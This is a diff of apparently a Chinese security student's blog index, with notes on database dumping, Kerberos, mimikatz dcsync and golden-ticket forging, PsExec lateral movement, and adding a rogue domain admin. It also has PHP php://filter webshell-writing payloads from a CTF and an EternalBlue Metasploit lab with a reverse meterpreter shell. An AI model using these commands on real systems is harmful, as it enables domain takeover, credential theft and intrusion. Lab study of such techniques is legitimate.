+<h1 id="网站源码备份"><a href="#网站源码备份" class="headerlink" title="网站源码备份"></a>网站源码备份</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">tar -zcvf ~&#x2F;html.tar.gz *</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="脱库"><a href="#脱库" class="headerlink" title="脱库"></a>脱库</h1><ul>
+<li>mysql</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqldump -u root -p --all-databases &gt; ~&#x2F;backup.sql  # 备份所有数据库</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在mysql&#x2F;data&#x2F;  中文件</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>mssql 数据库</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backup database Test to disk&#x3D;&#39;D:&#x2F;Test.bak&#39;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msdbdata.mdf msdblog.ldf 两个文件 copy 一份</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>acccess数据库</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mdb格式直接下载</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="渗透之信息收集"><a href="#渗透之信息收集" class="headerlink" title="渗透之信息收集"></a>渗透之信息收集</h1>]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>工具安装记录</title>
     <url>/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<p>[TOC]</p>
@@ -1336,6 +1593,9 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;CoreSecurity&#x2F;impacket.git</span><br><span class="line"></span><br><span class="line">cd impacket&#x2F;</span><br><span class="line"></span><br><span class="line">python setup.py install</span><br><span class="line"></span><br><span class="line">cd impacket&#x2F;examples</span><br><span class="line">工具都在这个目录里impacket&#x2F;examples</span><br></pre></td></tr></table></figure>
 
 <p>打内网里面很多py还是很方便的</p>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><h3 id="vscodo-go-debug环境-失败"><a href="#vscodo-go-debug环境-失败" class="headerlink" title="vscodo go debug环境 失败"></a>vscodo go debug环境 失败</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go env -w GO111MODULE&#x3D;auto</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.csdn.net/qq_43573718/article/details/119488777">(26条消息) VSCode安装go插件失败_编程猿哥的博客-CSDN博客</a></p>
 ]]></content>
       <categories>
         <category>工具</category>
@@ -1639,6 +1899,43 @@
       </tags>
   </entry>
   <entry>
+    <title>内网知识学习</title>
+    <url>/2022/01/23/%E5%86%85%E7%BD%91%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p>[toc]</p>
+<h1 id="ntlm协议"><a href="#ntlm协议" class="headerlink" title="ntlm协议"></a>ntlm协议</h1><p><a href="https://www.istt.org.cn/NewsDetail/2031875.html">Windows认证原理 网络认证(进阶篇)-江苏智慧安全可信技术研究院 (istt.org.cn)</a></p>
+<h1 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h1><p>Kerberos是一种由MIT提出的一种计算机网络授权协议，旨在通过使用加密技术为客户端/服务端应用程序提供强大的认证服务。</p>
+<p>Kerberos 主要是用在<code>域环境下的身份认证协议</code>。</p>
+<p><img src="/2022/01/23/%E5%86%85%E7%BD%91%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/image-20220124122003434.png" alt="image-20220124122003434"></p>
+<p>client              ——       TGT            ——               <strong>KDC</strong>，密钥分发中心(<strong>AS</strong>，身份验证服务,<strong>TGS</strong>，票据授权服务)</p>
+<p>|</p>
+<p>TGS(ticket )</p>
+<p>|</p>
+<p>server </p>
+<p>tgt   黄金票据</p>
+<p>tgs  白银票据</p>
+<p>EnhancedGolden <strong>Tickets</strong>    增强版（子域打域控）</p>
+<p>（权限维持）</p>
+<p>参考：</p>
+<p><a href="https://mp.weixin.qq.com/s/MWN5darSef0OqiT6rLk9nA">https://mp.weixin.qq.com/s/MWN5darSef0OqiT6rLk9nA</a></p>
+<p><a href="https://mp.weixin.qq.com/s/5u2dyu1wVji8d1IxLb11DA">https://mp.weixin.qq.com/s/5u2dyu1wVji8d1IxLb11DA</a></p>
+<p><a href="https://www.istt.org.cn/NewsDetail/2031879.html">Windows认证原理 Kerberos认证-江苏智慧安全可信技术研究院 (istt.org.cn)</a></p>
+<p>​    </p>
+<h1 id="解密浏览器密码工具"><a href="#解密浏览器密码工具" class="headerlink" title="解密浏览器密码工具"></a>解密浏览器密码工具</h1><p>（有杀软）本地解chrome数据库方法：<a href="https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.3.7">https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.3.7</a> </p>
+<p>（无杀软） 直接用<a href="https://github.com/moonD4rk/HackBrowserData">hack-browser-data.exe</a>导出cookie</p>
+<p>参考：</p>
+<p>dozerctf2021域渗透：<a href="https://www.yuque.com/w0rkmn/lnpppa/mdie6g#f755069b">https://www.yuque.com/w0rkmn/lnpppa/mdie6g#f755069b</a></p>
+<h1 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h1><p> 活动目录是一种目录服务：活动目录通过域控制器接受查询请求，查询活动目录数据库把域对象名字解析为对象记录</p>
+<p>​    <code>活动目录用户</code>通过<code>LDAP协议</code>（一种进入目录服务的协议）向活动目录服务器<code>发送请求</code>，为了定位提供查询服务的域控制器就需要借助于DNS。</p>
+<p>​    活动目录使用<code>DNS服务器</code>作为<code>定位服务器</code>，把域控制器解析为IP地址。活动目录要发挥作用，离不开DNS。</p>
+]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>内网知识学习</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>简单的靶场渗透</title>
     <url>/2022/01/03/%E7%AE%80%E5%8D%95%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/</url>
     <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">提示：一共12个flag，有内网。</span><br><span class="line">标准：5个合格</span><br><span class="line">靶场地址：http:&#x2F;&#x2F;1.14.65.168:8077&#x2F;m&#x2F;index.php</span><br><span class="line">刚过完年，来玩一玩</span><br></pre></td></tr></table></figure>
@@ -1751,6 +2048,101 @@
       </tags>
   </entry>
   <entry>
+    <title>内网横向渗透</title>
+    <url>/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<p>不断更新</p>
+<p>配合impacket工具使用</p>
+<h1 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h1><p>IPC$(Internet Process Connection)是共享”命名管道”的资源，是为了让进程间通信而开放的命名管道</p>
+<p>利用条件：</p>
+<ol>
+<li>开放139,445端口</li>
+<li></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net share   显示所有共享资源</span><br><span class="line"></span><br><span class="line">net use \\ip\ipc$ &quot;密码&quot; &#x2F;user:&quot;用户名&quot; 建立ipc非空连接</span><br><span class="line"></span><br><span class="line">net use h: \\ip\c$     将对方c 映射到本地h</span><br><span class="line"></span><br><span class="line">net use \\ip\c$ &#x2F;del   如果断开连接就删除重新连接就行</span><br></pre></td></tr></table></figure>
+
+
+
+<span id="more"></span>
+
+
+
+<h3 id="psexec-ipc"><a href="#psexec-ipc" class="headerlink" title="psexec+ipc$"></a>psexec+ipc$</h3><p>前提是与目标主机建立ipc连接</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.3.100\ipc$   建立ipc共享</span><br><span class="line"></span><br><span class="line">PsExec64.exe -accepteula \\&lt;目标机IP&gt; -s cmd.exe   #获得交互式shell，并且权限提升到system权限</span><br><span class="line"></span><br><span class="line">net group &#x2F;domain</span><br><span class="line"></span><br><span class="line">net user hack 123qwe... &#x2F;add &#x2F;domain   #创建普通域用户</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Admins&quot; hack &#x2F;add &#x2F;domain   #将普通域用户 提升为域管理</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="ipc-at"><a href="#ipc-at" class="headerlink" title="ipc+at"></a>ipc+at</h3><h3 id="ipc-schtasks"><a href="#ipc-schtasks" class="headerlink" title="ipc+schtasks"></a>ipc+schtasks</h3><h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><h1 id="winrm服务"><a href="#winrm服务" class="headerlink" title="winrm服务"></a>winrm服务</h1><h1 id="dcom"><a href="#dcom" class="headerlink" title="dcom"></a>dcom</h1><h1 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h1><h1 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h1><p>通常用来域内权限维持</p>
+<h3 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h3><p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220307225058167.png" alt="image-20220307225058167"></p>
+<p>krbtgt 是kdc服务使用账户，在Domain Admins组中，域环境中，用户账户的票据都是krbtgt生成的。</p>
+<p>如果攻击者拿到了 krbtgt的ntml hash或者AES-256值，<code>即可伪造任意用户身份</code></p>
+<p>需要条件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 需要伪造的域用户名（有域管，肯定伪造域管啦）</span><br><span class="line"></span><br><span class="line">2. 该域的域名</span><br><span class="line"></span><br><span class="line">3. krbtgt的ntml hash或者AES-256值</span><br><span class="line"></span><br><span class="line">4. 域krbtgt  SID (去掉-502)     （wmic useraccount get name,sid）</span><br></pre></td></tr></table></figure>
+
+<p>获得krbtgt账号的SID值和ntml hash哈希值     [这个需要我们用域账户（权限太低不行，即域管权限），并且将该用户加入本地管理员组，或者用域管理员方式进行cmd命令执行]</p>
+<ol>
+<li>获得hash等需要的条件信息</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync &#x2F;domain:shmily.god &#x2F;user:krbtgt&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220307225230207.png" alt="image-20220307225230207"></p>
+<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220307225631024.png" alt="image-20220307225631024"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SID        :S-1-5-21-2538459943-234226500-22795540782</span><br><span class="line">ntml hash  :8aecb1498df128a866968668302003bd</span><br><span class="line">aes256     :1f15a3cce65909ed19ff0e5ec6b7102f630be3725b12c66e25251ab0b81305e7 </span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>查询域管理员账号：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;domain admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308000619676.png" alt="image-20220308000619676"></p>
+<p>注入票据前</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir \\192.168.119.200\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308004612176.png" alt="image-20220308004612176"></p>
+<ol start="3">
+<li>清空会话票据</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308001049876.png" alt="image-20220308001049876"></p>
+<ol start="4">
+<li>生成黄金票据(Administrator.kiribi)</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::golden &#x2F;user:administrator &#x2F;domain:shmily.god &#x2F;sid:S-1-5-21-2538459943-234226500-22795540782 &#x2F;krbtgt:8aecb1498df128a866968668302003bd &#x2F;ticket:Administrator.kiribi</span><br><span class="line"></span><br><span class="line"># kerberos::golden &#x2F;user:要伪造的域用户(我们这一般写域管理员) &#x2F;domain:域名 &#x2F;sid:域的sid值 &#x2F;krbtgt:krbtgt的哈希 &#x2F;ptt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308002554785.png" alt="image-20220308002554785"></p>
+<ol start="5">
+<li>注入票据</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::ptt Administrator.kiribi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308002722245.png" alt="image-20220308002722245"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::tgt  查看当前票据</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308002904106.png" alt="image-20220308002904106"></p>
+<ol start="6">
+<li>验证</li>
+</ol>
+<p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220308003825467.png" alt="image-20220308003825467"></p>
+<p>使用黄金票据伪造的用户可以是任意用户（即使这个用户不存在），因为 TGT 的加密是由 krbtgt 完成的，所以只要 TGT 被 krbtgt 账户和密码正确的加密，那么任意 KDC 使用 krbtgt 将 TGT 解密后，TGT 中的所有信息都是可信的。</p>
+<h3 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h3><p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220307220404812.png" alt="image-20220307220404812"></p>
+<h3 id="EnhancedGolden-Tickets"><a href="#EnhancedGolden-Tickets" class="headerlink" title="EnhancedGolden Tickets"></a>EnhancedGolden Tickets</h3><p>参考：<a href="https://www.freebuf.com/articles/system/197160.html">https://www.freebuf.com/articles/system/197160.html</a></p>
+<p>通过域内主机在迁移时<code>LDAP库</code>中的<code>SIDHistory</code>属性中保存的<code>上一个域</code>的<code>SID值</code>制作可以跨域的金票。</p>
+<p>如果知道根域的SID那么就可以<code>通过子域</code>的KRBTGT的<code>HASH</code>值，使用mimikatz创建具有 EnterpriseAdmins组权限（域林中的最高权限）的票据。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::golden &#x2F;admin:administrator &#x2F;domain:news.yunying.lab &#x2F;sid:XXX &#x2F;sids:XXX &#x2F;krbtgt:XXX &#x2F;startoffset:0 &#x2F;endin:600 &#x2F;renewmax:10080 &#x2F;ptt</span><br></pre></td></tr></table></figure>
+
+<p>Startoffset和endin分别代表偏移量和长度，renewmax表示生成的票据的最长时间</p>
+<p>这使用的是子域krbtgt的 hash，根域的不知道。</p>
+<p>参考：渗透攻击红队公众号</p>
+<p><a href="https://cloud.tencent.com/developer/article/1653877">内网渗透（四） | 票据传递攻击 - 云+社区 - 腾讯云 (tencent.com)</a></p>
+]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>内网横向渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>面经</title>
     <url>/2021/07/01/%E9%9D%A2%E7%BB%8F/</url>
     <content><![CDATA[<h2 id="赛宁网安"><a href="#赛宁网安" class="headerlink" title="赛宁网安"></a>赛宁网安</h2><p>信息安全实习生（南京实习）</p>
@@ -1843,189 +2235,6 @@
       </categories>
       <tags>
         <tag>2021面经</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>内网信息收集</title>
-    <url>/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
-    <content><![CDATA[<h2 id="windows信息收集"><a href="#windows信息收集" class="headerlink" title="windows信息收集"></a>windows信息收集</h2><h4 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line"></span><br><span class="line">ipconfig &#x2F;all  #是否在域内，网卡信息等</span><br><span class="line"></span><br><span class="line">systeminfo  #查看主机信息，os名称，版本，域，补丁</span><br><span class="line">（要提取的话根据补丁，寻找https:&#x2F;&#x2F;i.hacking8.com&#x2F;tiquan）</span><br><span class="line"></span><br><span class="line">net user       #本机用户列表</span><br><span class="line">net localgroup administrators  #本地管理员</span><br><span class="line"></span><br><span class="line">wmic product get name,version   #查看安装软件版本</span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,Version&quot;          #查看安装软件版本</span><br><span class="line"></span><br><span class="line">tasklist       # 默认显示映像名称，PID，会话名，会话，内存使用</span><br><span class="line">tasklist &#x2F;svc  # 显示PID，服务  </span><br><span class="line">（查看是否有杀软 https:&#x2F;&#x2F;www.ddosi.com&#x2F;av&#x2F;1.php）</span><br><span class="line"></span><br><span class="line">netstat -nao               #查看端口</span><br><span class="line">netstat -an | find “3389”  #查看对应端口</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I|findstr “TTL&#x3D;”</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<p>ipconfig /all</p>
-<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621092728.png" alt="image-20210621092721554" style="zoom:150%;">
-
-
-
-<p>net  user</p>
-<p>net localgroup administrators </p>
-<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621095850.png" alt="20210621095850" style="zoom:150%;">
-
-<p>wmic product get name,version </p>
-<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621100332.png" alt="20210621100332">
-
-<p>powershell “Get-WmiObject -class Win32_Product | Select-Object -Property name,Version” </p>
-<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621100357.png" alt="20210621100357">
-
-
-
-<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621101825.png" alt="20210621101825"></p>
-<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621112046.png" alt="20210621112046" style="zoom:150%;">
-
-
-
-
-
-
-
-
-
-
-
-<h4 id="域的信息收集"><a href="#域的信息收集" class="headerlink" title="域的信息收集"></a>域的信息收集</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user &#x2F;domain           #查询域用户 (通过samr，利用的RPC接口)</span><br><span class="line">net view                   #查看域信息</span><br><span class="line">net view &#x2F;domain           #查看主域信息</span><br><span class="line">net accounts &#x2F;domain       #获取与密码信息(策略)</span><br><span class="line"></span><br><span class="line">net group &#x2F;domain                            #查询域内组</span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain         #查看域内所有的主机名</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain       #查看域控</span><br><span class="line">net group &quot;domain admins&quot;   &#x2F;domain          #查看域管理员</span><br><span class="line">net group &quot;enterpriser admins&quot;   &#x2F;domain     #查看企业管理用户</span><br><span class="line">net config workstation      #主机名，主机版本，工作站域，工作站域dns-name,当前登录域</span><br><span class="line"></span><br><span class="line">nslookup god.org            #可以定位域控</span><br><span class="line"></span><br><span class="line">net share                   #查看本地共享资源</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621103820.png" alt="20210621103820"></p>
-<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621104756.png" alt="20210621104756"></p>
-<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621104813.png" alt="20210621104813"></p>
-<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621104834.png" alt="20210621104834"></p>
-<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621105024.png" alt="20210621105024"></p>
-<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621111006.png" alt="20210621111006"></p>
-<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621112521.png" alt="20210621112521"></p>
-<p>查询域内的SPN。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前域内所有的SPN：setspn  -Q  *&#x2F;*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看指定域xie.com注册的SPN：setspn -T xxxxx.god -Q *&#x2F;*      如果指定域不存在，则默认切换到查找本域的SPN</span><br><span class="line"></span><br><span class="line">setspn -L username</span><br><span class="line">setspn -L hostname   查询用户  或者主机名注册的spn</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220303175201822.png" alt="image-20220303175201822"></p>
-<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220303175812371.png" alt="image-20220303175812371"></p>
-<p>参考：</p>
-<p><a href="https://www.t00ls.net/articles-39285.html">内网渗透命令大全</a></p>
-<p><a href="https://jwt1399.top/posts/25535.html#toc-heading-14">Attck1</a></p>
-<p><a href="https://mp.weixin.qq.com/s/aXEJpZVxxSkFUfG8TqsxHw">内网渗透学习导航</a></p>
-<p><a href="https://mp.weixin.qq.com/s/l6AajnxFp8GMIYqVcN4SGg">参考1</a></p>
-<p>命令</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user hack 123qwe... &#x2F;add &#x2F;domain   #创建普通域用户</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Admins&quot; hack &#x2F;add &#x2F;domain   #将普通域用户 提升为域管理</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>内网</category>
-      </categories>
-      <tags>
-        <tag>内网信息收集</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>file_put_content利用(php://filter协议)</title>
-    <url>/2020/10/25/file-put-contents%E5%88%A9%E7%94%A8-php-filter%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<hr>
-<h3 id="0×01"><a href="#0×01" class="headerlink" title="0×01"></a>0×01</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(_FILE_);</span><br><span class="line">chdir(<span class="string">&quot;sandbox&quot;</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span>  = <span class="string">&#x27;&lt;?php exit(); ?&#x27;</span>. <span class="variable">$filename</span>;</span><br><span class="line">file_put_content(<span class="variable">$filename</span>,<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
-
-
-
-<p><code>exit</code>加在filename前面，会导致写入的内容不能执行。（利用php base64_decode函数特性去除“死亡exit”）</p>
-<span id="more"></span>
-
-<blockquote>
-<p>Payload:     </p>
-<p>/?file=filter/write=convert.base64-deconde|aPD9waHAgcGhwaW5mbygpOz8+/recource=shell.php </p>
-<p>/?file = php://filter/write=string.rot13|<code>&lt;?cuc cucvasb();?&gt;</code>/resource=shell.php    rot13编码</p>
-</blockquote>
-<h3 id="0×02"><a href="#0×02" class="headerlink" title="0×02"></a>0×02</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
-
-
-
-<p>base64可打印（A-Z a-z 0-9 +/）<code>=</code>补位  ,遇到不符合的字符会跳过，所以&lt; ? ; ? &gt;; 和空格 七个字符不符合，</p>
-<p>最终解码只有<code>phpexit</code>7个字符，base64解码是4个一组的，所有要在shell前面加个a,</p>
-<blockquote>
-<p>Payload: </p>
-<p>/?txt=aPD9waHAgcGhwaW5mbygpOz8+&amp;filename=php://filter/write=convert.base64-deconde/resource=shell.php       //PD9waHAgcGhwaW5mbygpOz8+前面要多加一个a</p>
-</blockquote>
-<hr>
-<p>参考博客：<a href="https://www.cnblogs.com/vege/p/12650702.html">https://www.cnblogs.com/vege/p/12650702.html</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>file_put_content</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MSF-永恒之蓝入侵</title>
-    <url>/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://shmily-ing.github.io/">Shmily-ing’blog</a>! </p>
-<h3 id="实验场景"><a href="#实验场景" class="headerlink" title="实验场景"></a>实验场景</h3><p>渗透机kali      ip:192.168.119.138</p>
-<p>靶机 win7-2    ip:192.168.119.132</p>
-<p>子网掩码：255.255.255.0</p>
-<span id="more"></span>
-
-<h3 id="测试能否ping通"><a href="#测试能否ping通" class="headerlink" title="测试能否ping通"></a>测试能否ping通</h3><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926193858120.png" alt="image-20200926193858120">
-
-<p>​       </p>
-<img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926193926874.png" alt="image-20200926193926874">
-
-<p>ok 可以</p>
-<hr>
-<ul>
-<li>kali打开 msfconsole</li>
-</ul>
-<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926194608129.png" alt="image-20200926194608129"></p>
-<ul>
-<li>输入search ms17_010</li>
-</ul>
-<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926195212894.png" alt="image-20200926195212894"></p>
-<p><code>auxiliary/scanner/smb/smb_ms17_010</code>             为扫描模板</p>
-<p><code>exploit/windows/smb/ms17_010_eternalblue</code>为攻击模板</p>
-<h3 id="扫描是否存在该漏洞"><a href="#扫描是否存在该漏洞" class="headerlink" title="扫描是否存在该漏洞"></a>扫描是否存在该漏洞</h3><blockquote>
-<p>ues <code>auxiliary/scanner/smb/smb_ms17_010</code>    #使用模块</p>
-<p>optipons                                                                         #查看我们需要的设置</p>
-<p>set rhosts   192.168.119.1-137                                       #设置目标ip范围</p>
-<p>set threads     20                                                             #设置线程，加快扫描</p>
-<p>run</p>
-</blockquote>
-<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926201345760.png" alt="image-20200926201345760"></p>
-<p>我们可以发现存在漏洞的地方</p>
-<hr>
-<h3 id="运用攻击模块"><a href="#运用攻击模块" class="headerlink" title="运用攻击模块"></a>运用攻击模块</h3><blockquote>
-<p>use   <code>exploit/windows/smb/ms17_010_eternalblue</code></p>
-<p>set rhosts  192.168.119.132</p>
-<p>set payload windows/x64/meterpreter/reverse_tcp</p>
-<p>set lhost 192.168.119.138</p>
-<p>exploit</p>
-</blockquote>
-<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926205215563.png" alt="image-20200926205215563"></p>
